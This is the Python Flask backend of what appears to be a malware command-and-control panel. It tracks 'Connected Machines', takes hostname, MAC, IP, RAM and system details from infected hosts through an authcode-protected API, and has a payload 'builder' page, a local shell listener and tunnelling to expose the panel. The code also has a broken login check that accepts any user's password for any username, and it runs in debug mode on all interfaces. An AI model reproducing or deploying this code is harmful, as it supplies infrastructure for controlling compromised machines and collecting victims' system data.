#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    File:   app.py
    Author: codeuk
    Date:   18/07/2022
    Python: 3.10
"""

from optparse import Option
from typing import Optional
from flask import (
    Flask,
    g,
    redirect,
    render_template,
    request,
    session,
    url_for
)

import os
import requests
import threading

from modules.static      import Static
from modules.database    import User, DB
from modules.encryption  import Encryption
from modules.shell       import SimpleShell
from modules.localtunnel import Localtunnel
from modules.config      import Settings, Colors

class App(Flask):
    def run(
        self,
        host:  Optional[str] = None,
        port:  Optional[int] = None,
        debug: Optional[bool] = None,
        **options
    ):
        if not self.debug or os.getenv('WERKZEUG_RUN_MAIN') == 'true':
            with self.app_context():
                s = SimpleShell(port=6666, host="localhost")
                t = threading.Thread(target=s.Main)
                t.start()
        super(App, self).run(host=host, port=port, debug=debug, **options)

class API:
    """ Shitty Flask Backend/API for the Panel"""

    def __init__(self, port, debug):
        self.app   = App(__name__)
        self.port  = port
        self.debug = debug

        app = self.app
        app.secret_key = "***"

        @app.before_request
        def before_request():
            g.user = None

            if 'user_id' in session:
                user = [x for x in DB.userlist if x.id == session['user_id']][0]
                g.user = user

        @app.route('/')
        @app.route('/dashboard', methods=['GET'])
        def dashboard():
            if not g.user:
                return redirect(url_for('login'))

            users = DB.userlist
            admins = DB.adminlist
            amount = len(users)
            auth_amt = len(DB.authcodes)

            for i, user in enumerate(users):
                if users[i].admin and user not in admins: 
                    DB.adminlist.append(user)

            return render_template(
                'dashboard.html',
                list=users,
                amount=amount,
                version="0.1",
                adminlist=admins,
                auth_amt=auth_amt,
                admins=len(admins),
                auths=DB.authcodes,
                users= enumerate(users),
                theme=Settings.PANEL_COLOR,
                testmode=Settings.TESTING_MODE
            )

        @app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method=='POST':
                session.pop('user_id', None)

                username = request.form['username']
                password = request.form['password']

                try:
                    user = [u for u in DB.userlist if u.username == username][0]
                    pwd  = [p for p in DB.userlist if p.password == password][0]
                except IndexError:
                    return redirect(url_for('login'))

                print(f"adminpanel: <login> {username}:{'*'*len(password)}")

                if user and pwd:
                    session['user_id'] = user.id
                    session['user_id'] = user.id
                    return redirect(url_for('dashboard'))
                return redirect(url_for('login'))
            return render_template('login.html')

        @app.route('/users', methods=['GET'])
        def display_users():
            if not g.user:
                return redirect(url_for('login'))

            users = DB.userlist
            _len  = len(users)

            return render_template(
                'users.html',
                title= 'Connected Machines',
                users= enumerate(users),
                amount=_len,
                list = users,
                theme=Settings.PANEL_COLOR
            )

        @app.route('/user/<id>')
        @app.route('/users/<id>', methods=['GET'])
        def user_profile(id):
            if not g.user:
                return redirect(url_for('login'))
            try:
                user = DB.userlist[int(id)-1]
                return render_template('user.html', user=user, theme=Settings.PANEL_COLOR)
            except Exception as e:
                return errorPage(f"Invalid User ID Passed: {id}")

        @app.route('/builder', methods=['GET'])
        def builder():
            if not g.user:
                return redirect(url_for('login')) 
            return render_template(
                'builder.html',
                url=request.url_root,
                theme=Settings.PANEL_COLOR
            )

        @app.route('/settings', methods=['GET'])
        def settings():
            if not g.user:
                return redirect(url_for('login')) 
            return render_template('settings.html', theme=Settings.PANEL_COLOR)

        @app.route('/settings/lt', methods=['POST'])
        def change_localtunnel():
            if request.form['use_lt']=="ON":
                Settings.USE_LOCALTUNNEL = True
                Localtunnel.start(app)
            else: Settings.USE_LOCALTUNNEL = False

            return redirect(url_for('settings'))

        @app.route('/settings/tm', methods=['POST'])
        def change_testmode():
            if request.form['use_tm']=="OFF":
                Settings.TESTING_MODE = False
                return redirect(url_for('settings'))
            else:
                return errorPage("You can't turn this on through the panel \
                    for safety purposes, please do it manually.")

        @app.route('/newtheme', methods=['POST'])
        def change_theme():
            new_color = request.form['theme_color'].lower()
            Settings.PANEL_COLOR = Colors.c[new_color]

            return redirect(url_for('settings'))

        @app.route('/createauth', methods=['POST'])
        def createauth():
            auth = request.form['authcode']
            if len(DB.authcodes)<6:
                DB.authcodes.append(auth)
            return redirect(url_for('dashboard'))

        @app.route('/delAdmin/<int:id>', methods=['GET']) # unfinished
        def deleteadmin(id):
            if not g.user:
                return redirect(url_for('login'))
            if id == 1:
                return errorPage("You cannot delete the default admin account")
            try:
                DB.userlist.pop(int(id)-1)
                return redirect(url_for('dashboard'))
            except:
                return errorPage("Invalid Admin ID")

        @app.route('/api/ip/<ip>')
        @app.route('/api/iplookup/<ip>', methods=['GET'])
        def ip_lookup(ip):
            info = Static.IP2Info(ip)
            return info, 200

        @app.route('/api/users', methods=['GET'])
        def userlist(ip):
            return DB.userlist

        @app.route('/api/lookup', methods=['POST'])
        def user_lookup():
            id = request.form['uid']
            try:
                user = DB.userlist[int(id)-1]
                return render_template('user.html', user=user, theme=Settings.PANEL_COLOR)
            except:
                return errorPage(f"Invalid User ID Passed: {id}")

        @app.route('/api/adduser', methods=['POST'])
        def adduser():
            req  = request.get_json()
            auth = request.headers.get("auth")

            if User.VerifyAuth(auth):
                new_user = self.AddNewUser(
                    username=req['username'],
                    ip=req['ip'],
                    pcname=req['pcname'],
                    cores=req['cores'],
                    localmacs=req['localmacs'],
                    localips=req['localips'],
                    sysinfo=req['sysinfo'],
                    ram=req['ram']
                )
                return f"user added: {new_user}", 201
            else: return "invalid authorization", 400

        @app.route('/api/addAdmin', methods=['POST'])
        def addadmin():
            auth = request.form['auth']
            username = request.form['admin_username']
            password = request.form['admin_password']
            if User.VerifyAuth(auth):
                new_admin = self.AddNewUser(
                    username=username,
                    password=password,
                    admin=True
                )
            return redirect(url_for('dashboard'))

        """ TESTING_MODE needs to be set to True for these to be used!"""
        @app.route('/rndAdmin', methods=['GET'])
        def rndadmin():
            if Settings.TESTING_MODE:
                username, password = Static.RandomUserInfo()
                new_admin = self.AddNewUser(
                    username=username,
                    password=password,
                    admin=True,
                    bot=True
                )
                return redirect(url_for('dashboard'))
            else:
                return errorPage("This feature only works in testing mode")

        @app.route('/rndUser', methods=['GET'])
        def rnduser():
            if Settings.TESTING_MODE:
                username, _ = Static.RandomUserInfo()
                new_admin = self.AddNewUser(
                    username=username,
                    bot=True
                )
                return redirect(url_for('dashboard'))
            else:
                return errorPage("This feature only works in testing mode")

        def errorPage(error):
            return render_template(
                'error.html',
                error=error,
                theme=Settings.PANEL_COLOR
            )

        app.run(
            host='0.0.0.0',
            port=self.port,
            debug=self.debug
        )

    def AddNewUser(
        self:      object,
        username:  str,
        password:  Optional[str]  = None,
        ip:        Optional[str]  = "localhost",
        sysinfo:   Optional[str]  = "localhost",
        ram:       Optional[int]  = 0,
        cores:     Optional[int]  = 0,
        pcname:    Optional[int]  = 0,
        localmacs: Optional[list] = [],
        localips:  Optional[list] = [],
        admin:     Optional[bool] = False,
        bot:       Optional[bool] = False,
    ) -> bool:
        """ Validate and add new user to DB """
        if self.VerifyAccount(username, admin):
            token, _id = User.GenerateUserInfo()
            DB.userlist.append(User(
                id=_id,
                username=username,
                password=password,
                token=token,
                admin=admin,
                pcname=pcname,
                localmacs=localmacs,
                localips=localips,
                sysinfo=sysinfo,
                cores=cores,
                ram=ram,
                bot=bot,
                ip=ip
            ))
            return True
        return False

    def VerifyAccount(self, username, admin) -> bool:
        """ Check if account info is valid """
        if admin and len(DB.adminlist) >= 6:
            return False
        if (
            username not in DB.names
            and username != None
            and len(username) >= 3
            and len(username) <= 12
        ):
            DB.names.append(username)
            return True
        return False

if __name__ == '__main__':
    DB.userlist.append(User(
        id=1,
        username=Settings.ADMIN_USER,
        password=Settings.ADMIN_PASS,
        admin=True,
        token="DEFAULT"
    ))

    Static.Clear()
    API(port=80, debug=True)
